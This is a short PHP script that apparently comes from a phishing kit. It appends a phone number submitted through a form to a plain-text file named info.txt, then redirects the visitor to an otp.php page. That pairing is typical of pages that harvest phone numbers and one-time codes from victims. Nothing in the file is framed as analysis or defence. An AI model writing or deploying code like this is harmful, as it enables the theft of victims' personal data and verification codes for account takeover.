<?php
file_put_contents("info.txt", "PHONE : " . $_POST["phone"], FILE_APPEND);
header("Location: otp.php");